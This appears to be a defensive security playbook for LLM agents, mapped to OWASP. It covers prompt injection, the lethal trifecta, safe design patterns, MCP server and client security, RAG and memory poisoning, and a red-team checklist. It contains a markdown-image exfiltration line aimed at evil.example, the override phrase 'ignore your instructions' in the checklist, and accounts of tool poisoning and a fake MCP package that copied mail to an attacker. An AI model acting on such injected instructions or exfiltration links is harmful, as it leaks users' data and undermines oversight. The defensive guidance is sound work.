---
name: ai-agent-security
description: Security playbook for LLM apps and AI agents (verified 2026-10-03, OWASP API Top 10 mapping added 2026-10-08) — prompt injection (direct + indirect) and why it can't be filtered away, the lethal trifecta / Agents Rule of Two test, the six injection-resistant design patterns (action-selector, plan-then-execute, map-reduce, dual LLM, code-then-execute, context minimization), tool/permission design, MCP server and client security (token passthrough, confused deputy, SSRF, local server compromise, scope minimization), output handling, memory/RAG poisoning, cost/DoS limits, logging, and red-team tests — mapped to OWASP Top 10 for LLM Apps 2025 and OWASP Top 10 for Agentic Applications 2026. Use when designing, reviewing or threat-modelling any agent, chatbot, RAG system, n8n AI workflow or MCP integration; when an agent reads email/web/docs/tickets; or before giving an agent write access, network egress or secrets. Pairs with decision-model-guards (cheap classifier guards/routers), secrets-rotation (credentials), eu-ai-compliance (legal side), llm-integration-patterns (architecture).
---

# AI agent security

**The one rule:** once an LLM has read untrusted input, that input must not be able to trigger a consequential action. Filters and "ignore previous instructions" detectors reduce attempts; they don't make this true. Architecture does.

## 1. Threat model in 60 seconds — the lethal trifecta / Rule of Two

An agent is exploitable by prompt injection when it has all three:
1. **Untrusted input** — anything an outsider can write: email, web pages, PDFs, tickets, form fields, code comments, tool output, other agents' messages, images.
2. **Sensitive data / systems** — private files, CRM, DB, credentials, internal APIs.
3. **Outbound action** — can send, post, write, call URLs, change state (even rendering a markdown image URL counts — it's an HTTP request carrying data).

**Rule of Two (Meta, 2025):** an agent may have at most two of the three in one session without a human approving actions. Need all three → human-in-the-loop on the outbound step, or split into separate agents/sessions.

Write the three columns down for every agent you design. If all three are ticked, the design isn't done.

Why filters aren't enough: LLMs can't reliably tell instructions from data, and adaptive attackers beat published guardrails ("The Attacker Moves Second", 2025). A 95% filter is a 5% breach rate at scale. Use filters as a detection/noise layer, never as the boundary — cheap decision-model guards with confidence gating are in `decision-model-guards`.

## 2. Design patterns that actually constrain injection

From "Design Patterns for Securing LLM Agents against Prompt Injections" (Beurer-Kellner et al., 2025):

| Pattern | How | Cost |
|---|---|---|
| **Action-selector** | LLM only picks from a fixed menu of actions; never sees tool results | Can't read/reason over data |
| **Plan-then-execute** | Plan the tool calls *before* touching untrusted content; content can fill parameters, not change which actions run | Injected content can still poison parameters (email body) — not recipients |
| **LLM map-reduce** | Sub-agents each process one untrusted item and return only constrained output (bool, enum, schema); aggregator never sees raw text | Less flexible |
| **Dual LLM** | Privileged LLM plans; quarantined LLM reads untrusted text and returns symbolic variables ($VAR1) the privileged one never reads | More plumbing |
| **Code-then-execute** (CaMeL-style) | Privileged LLM writes a program in a restricted DSL; interpreter tracks taint and blocks tainted data from reaching sinks | Limited to the DSL |
| **Context minimization** | Convert the user request to a structured query, then drop the raw text from context | Loses nuance later |

Practical defaults for automation work:
- Classification / extraction from inbound email or docs → **map-reduce with a strict JSON schema** (enum fields, length caps). The output can't carry instructions if it can only be `"invoice" | "complaint" | "other"`.
- Drafting replies → agent drafts, **human sends** (n8n wait/approval gate, LangGraph `interrupt()`, `HumanInTheLoopMiddleware`).
- Research agent with web access → **no secrets and no write tools in the same session**.

## 3. Tools and permissions (OWASP LLM06 Excessive Agency, ASI02/ASI03)

- **Fewest tools, narrowest scope.** `send_email_to_customer(ticket_id, body)` not `send_email(to, subject, body)`. Hardcode or allowlist destinations; the model fills content, not targets.
- **Read vs write separation** — separate credentials per tool; read-only DB user for query tools; never one admin token for everything.
- **Per-user authorization in the tool, not the prompt.** The tool checks that the *authenticated caller* may touch record X. "The system prompt says only show the user's own data" is not access control.
- **Approval on irreversible / outbound actions:** payments, deletes, external sends, permission changes, deploys, anything touching money or other people.
- **Egress control:** allowlist outbound domains for agent runtimes; block `169.254.169.254` and private ranges (SSRF → cloud credentials).
- **Sandbox code execution** (ASI05): container/VM with no host mounts, no network by default, CPU/mem/time limits, throwaway filesystem. Never `exec` model output on the host.
- **Agent identity** (ASI03): agents get their own service accounts with audit trails — not the developer's personal token, not a shared key.

## 4. MCP-specific (spec "Security Best Practices", draft 2026)

Server side:
- **No token passthrough** — MUST NOT accept tokens not issued for this server (check `aud`); never forward the client's token downstream.
- **Confused deputy** (proxy servers with a static client ID to a 3rd-party API): MUST keep per-client consent *before* forwarding to the 3rd-party OAuth; exact-match `redirect_uri`; single-use short-lived `state`, set only after consent; consent cookies `__Host-`, `Secure`, `HttpOnly`, `SameSite=Lax`, bound to `client_id`.
- **State handles aren't auth** — bind any cart/workflow/session handle server-side to the verified user id (`<user_id>:<handle>`), random not sequential, expiring.
- **Scope minimization** — start with a minimal read scope, step up with `WWW-Authenticate scope=` challenges; no `*`/`admin` omnibus scopes.
- **Local servers:** prefer `stdio`; if HTTP on localhost, require a token or use a unix socket (DNS rebinding hits unauthenticated localhost servers).
- Never print to stdout in stdio servers (breaks the protocol) — logs to stderr.
- **Tool handlers are API endpoints — apply the OWASP API Security Top 10 (2023) inside them.** The model is not an authorization layer: any `account_id`/`order_id` argument gets an ownership check in the handler (API1 BOLA); return explicit DTOs, never raw entities with internal fields (API3 BOPLA); role-check privileged tools server-side, not by hiding them from the tool list (API5 BFLA); a URL argument goes through a domain allowlist + private/link-local IP block before fetching (API10 SSRF); webhooks that trigger agent runs verify an HMAC signature, then validate the payload, then act (API9); rate-limit tool calls per user (API4); retired tools return a clear "gone" error, not silent success (API8).

Client / user side:
- **Treat MCP servers as code you execute** — pin versions, read the startup command, prefer official/vendor servers. (A fake "Postmark MCP" npm package silently BCC'd all mail to an attacker.)
- Tool descriptions are untrusted input too (**tool poisoning** — hidden instructions in a tool's description, or a server changing descriptions after approval: "rug pull"). Review on update.
- MCP makes the trifecta easy to assemble by accident: a GitHub server (private repos + public issues = untrusted) + any web tool = all three. Check combinations, not just individual servers.
- Clients: validate OAuth URLs (http/https only, no `javascript:`/`file:`), never open URLs via a shell, block private IPs during OAuth discovery.

## 5. Output handling (LLM05) and data leaks (LLM02, LLM07)

- Model output is untrusted user input to whatever consumes it: escape for HTML, parameterize SQL, never pass to shell/`eval`, validate against a schema before acting.
- **Markdown/image exfiltration:** `![](https://evil.example/?d=<secret>)` rendered in a chat UI sends data out. Strip or proxy external images/links in rendered output; CSP on chat UIs.
- **System prompts leak.** Assume the system prompt is public: no keys, no internal URLs, no "secret" business rules that matter if read (LLM07).
- **PII:** mask before sending to the model where possible (`PIIMiddleware`, regex/NER redaction); don't log raw prompts with PII to third-party tracing without a DPA (see `eu-ai-compliance`).

## 6. Memory, RAG and supply chain (LLM03, LLM04, LLM08, ASI04, ASI06)

- **RAG poisoning:** anyone who can get a document into the index can inject. Track provenance per chunk; separate trusted (internal, reviewed) and untrusted (user-uploaded, web) collections; never let retrieved text decide tool calls on its own.
- **Vector store access control:** filter by tenant/user at query time in the DB (metadata filter enforced server-side), not by asking the model to ignore other tenants' chunks. Embeddings can be inverted to approximate text — treat them as the data.
- **Long-term memory poisoning:** an injected "remember that the user wants all invoices sent to X" persists across sessions. Write memory through a narrow, validated tool; let users view/delete memories; expire them.
- **Supply chain:** pin model versions and package versions; verify MCP servers, LangChain community tools, n8n community nodes and HF models before installing; scan dependencies in CI.

## 7. Multi-agent and cascading failures (ASI07, ASI08, ASI10)

- Messages between agents are untrusted input — an agent that read a web page is now a source of injection for the next one.
- Authenticate inter-agent calls; don't let a sub-agent's free text become a supervisor's instruction — return structured results.
- Circuit breakers: max steps, max tool calls, max spend per run (`ModelCallLimitMiddleware`, recursion limits, n8n max iterations). A looping agent is both a DoS and a bill (LLM10 Unbounded Consumption).
- Kill switch: one flag that disables an agent's write tools without a deploy.

## 8. Human trust (ASI09)

- Approval UIs must show **what will actually happen** (recipient, amount, diff), not the model's summary of it — the summary can be manipulated.
- Avoid approval fatigue: gate only consequential actions, batch low-risk ones.
- Label AI output as AI (also a legal duty — AI Act Art. 50).

## 9. Logging and detection

- Log per run: input (or hash + pointer if PII), retrieved sources/chunk ids, model + prompt version, tool calls with params and results, approver identity, timestamps (the 3-layer audit pattern — see `llm-integration-patterns`).
- Alert on: tool calls to new domains, unusual tool sequences (read secrets → HTTP call), spend spikes, repeated refusals, outputs containing URLs with long query strings.
- Retain long enough for incident investigation and legal duties; restrict access (logs contain the data you were protecting).

## 10. Red-team checklist before go-live

Run each against the real agent (staging), record pass/fail:
- [ ] Direct injection: "ignore your instructions and …", role-play, encoded (base64, other language) variants.
- [ ] Indirect injection via every untrusted input channel (email body, PDF text, HTML comment, hidden white text, image text, filename, tool output).
- [ ] Exfiltration: ask it to include data in a link/image/URL; ask it to email/post data externally.
- [ ] Privilege: ask for another user's/tenant's records; ask it to call a tool it shouldn't.
- [ ] Tool parameter tampering: injected recipient/amount/path changes.
- [ ] System prompt extraction.
- [ ] Runaway: prompt that causes loops / huge outputs — limits trip?
- [ ] Memory poisoning: inject a "remember …" and check a fresh session.
- [ ] Approval bypass: can it act without the gate (alternate tool, chained calls)?
Tools: promptfoo red-team, garak, PyRIT; plus hand-written cases specific to your tools. Put the cases in the eval suite so regressions fail CI.

## OWASP reference

**LLM Top 10 (2025):** LLM01 Prompt Injection · 02 Sensitive Information Disclosure · 03 Supply Chain · 04 Data & Model Poisoning · 05 Improper Output Handling · 06 Excessive Agency · 07 System Prompt Leakage · 08 Vector & Embedding Weaknesses · 09 Misinformation · 10 Unbounded Consumption.
**Agentic Top 10 (2026, published Dec 2025):** ASI01 Agent Goal Hijack · 02 Tool Misuse & Exploitation · 03 Identity & Privilege Abuse · 04 Agentic Supply Chain · 05 Unexpected Code Execution · 06 Memory & Context Poisoning · 07 Insecure Inter-Agent Communication · 08 Cascading Failures · 09 Human-Agent Trust Exploitation · 10 Rogue Agents.

## Sources
- OWASP Top 10 for LLM Applications 2025 — https://genai.owasp.org/llm-top-10/
- OWASP Top 10 for Agentic Applications 2026 — https://genai.owasp.org (summaries: https://goteleport.com/blog/owasp-top-10-agentic-applications/)
- MCP Security Best Practices — https://modelcontextprotocol.io/specification/draft/basic/security_best_practices
- Lethal trifecta — https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- Design patterns paper summary — https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/
- Agents Rule of Two (Meta) — https://ai.meta.com/blog/practical-ai-agent-security/
